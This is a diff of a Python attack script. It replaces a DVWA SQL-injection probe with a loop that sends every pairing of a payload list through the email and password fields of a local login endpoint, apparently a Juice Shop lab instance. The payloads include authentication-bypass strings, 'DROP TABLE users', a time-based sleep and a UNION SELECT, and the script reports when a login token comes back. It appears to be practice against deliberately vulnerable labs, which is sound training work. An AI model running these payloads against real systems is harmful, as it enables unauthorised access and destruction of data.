@@ -1,39 +1,38 @@
 import requests
-from bs4 import BeautifulSoup
+
+sql_payloads = [
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "'; DROP TABLE users; --",
+    "' OR 1=1 --",
+    "' OR '1'='1' --",
+    "' OR '1'='1' /*",
+    "admin'--",
+    "' or sleep(5)--",
+    "' UNION SELECT null, version()--"
+]
+
+BASE = "http://127.0.0.1:3001/"
 
 s = requests.Session()
 
-login_url = "http://localhost/DVWA/login.php"
+url = f"{BASE}/rest/user/login"
 
-r = s.get(login_url)
+for p in sql_payloads:
+    for p2 in sql_payloads:
+        data = {
+            "email": p,
+            "password": p2
+        }
+        r = s.post(url, json=data)
 
-soup = BeautifulSoup(r.text, "html.parser")
-token = soup.find("input", {"name": "user_token"})["value"]
+        if r.status_code != 401:
+            try:
+                token = r.json().get("authentication", {}).get("token")
+            except:
+                token = None
 
-print("[+] Token:", token)
-
-login_data = {
-    "username": "admin",
-    "password": "password",
-    "Login": "Login",
-    "user_token": token
-}
-
-r2 = s.post(login_url, data=login_data)
-
-print("[+] Login status:", r2.status_code)
-
-s.get("http://localhost/DVWA/security.php?security=low&seclev_submit=Submit")
-
-url = "http://localhost/DVWA/vulnerabilities/sqli/"
-
-payloads = ["1", "'", '"', "--", "'("]
-
-for payload in payloads:
-    r = s.get(url, params={"id": payload})
-
-    print("\nPayload:", payload)
-    print("Status:", r.status_code)
-
-    if "sql" in r.text.lower() or "mysql" in r.text.lower():
-        print("[!] możliwy SQL error")
+            if token:
+                print("LOGIN SUCCESS")
+            else:
+                print("LOGIN FAILED")
